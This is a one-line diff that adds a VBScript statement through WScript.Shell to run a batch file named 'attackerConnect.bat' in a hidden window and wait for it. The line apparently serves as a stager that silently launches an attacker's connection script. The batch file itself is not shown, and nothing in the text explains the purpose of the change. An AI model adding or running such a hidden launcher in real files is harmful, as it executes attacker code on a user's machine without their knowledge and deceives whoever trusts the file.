@@ -1,0 +1,1 @@
+CreateObject("wscript.shell").Run "attackerConnect.bat", 0, True
